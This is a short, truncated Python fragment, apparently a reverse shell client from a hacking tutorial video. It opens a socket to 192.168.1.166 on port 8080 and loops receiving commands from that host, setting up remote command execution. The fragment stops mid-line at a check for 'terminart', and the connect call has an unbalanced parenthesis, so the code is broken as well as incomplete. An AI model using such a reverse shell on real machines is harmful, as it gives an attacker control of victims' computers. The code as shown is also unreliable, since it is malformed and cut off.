import socket
import subprocess # See video https://www.youtube.com/watch?v=2Fp1N6dof0Y

def connect():
    s = socket.socket()
    s.connect("192.168.1.166",8080))
    while True:
        command = s.recv(1024)
        if "terminart